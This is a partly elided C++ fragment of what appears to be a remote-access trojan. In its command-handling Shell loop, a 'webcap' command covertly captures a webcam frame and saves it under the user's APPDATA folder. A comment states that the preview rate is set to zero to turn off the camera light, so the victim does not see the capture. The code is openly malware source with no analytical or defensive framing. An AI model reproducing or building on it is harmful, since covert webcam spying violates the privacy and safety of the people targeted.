...
int Shell(SOCKADDR_IN addr) {
	...
	while (true) {
		...
		else if (!strcmp(buffer, "webcap"))
		{
			std::string path = getenv("APPDATA");
			std::string fullPath = path + "/pic";
			std::string filePath = fullPath + "/capture.png";
			std::filesystem::create_directory(fullPath);
			// Open the capture device
			HWND hWndCap = capCreateCaptureWindowA("Capture", WS_VISIBLE | WS_CHILD, 0, 0, 640, 480, GetDesktopWindow(), 0);
			if (!hWndCap)
			{
			...
			{
				std::cout << "Failed to connect to capture device\n";
				return 1;
			}
			// Set the preview rate to 0 to turn off the camera light
			if (!SendMessage(hWndCap, WM_CAP_SET_PREVIEWRATE, 0, 0))
			{
				std::cout << "Failed to set preview rate\n";
				return 1;
			}

			// Retrieve the list of supported formats
			int numFormats = SendMessage(hWndCap, WM_CAP_GET_VIDEOFORMAT, 0, 0);
			if (numFormats == 0)
			{
				std::cout << "Failed to retrieve the number of supported formats\n";
				return 1;
			}
			LPBITMAPINFOHEADER pFormats = new BITMAPINFOHEADER[numFormats];
			if (!SendMessage(hWndCap, WM_CAP_GET_VIDEOFORMAT, numFormats, reinterpret_cast<LPARAM>(pFormats)))
			{
				std::cout << "Failed to retrieve supported formats\n";
				delete[] pFormats;
				return 1;
			}

			// Set the capture format to the first supported format
			BITMAPINFOHEADER bmi = pFormats[0];
			if (!SendMessage(hWndCap, WM_CAP_SET_VIDEOFORMAT, sizeof(bmi), reinterpret_cast<LPARAM>(&bmi)))
			{
				std::cout << "Failed to set capture format\n";
				delete[] pFormats;
				return 1;
			}
			...
			const int len = MultiByteToWideChar(CP_UTF8, 0, fileName, -1, NULL, 0);
			wchar_t* wFileName = new wchar_t[len];
			MultiByteToWideChar(CP_UTF8, 0, fileName, -1, wFileName, len);

			// Save the frame data as a BMP file
			if (!SendMessage(hWndCap, WM_CAP_FILE_SAVEDIB, 0, reinterpret_cast<LPARAM>(wFileName)))
			{
				std::cout << "Failed to save captured frame\n";
				delete[] pFormats;
				delete[] wFileName;
				return 1;
			}
			...
			if (!SendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0))
			{
				std::cout << "Failed to disconnect from capture device\n";
				return 1;
			}
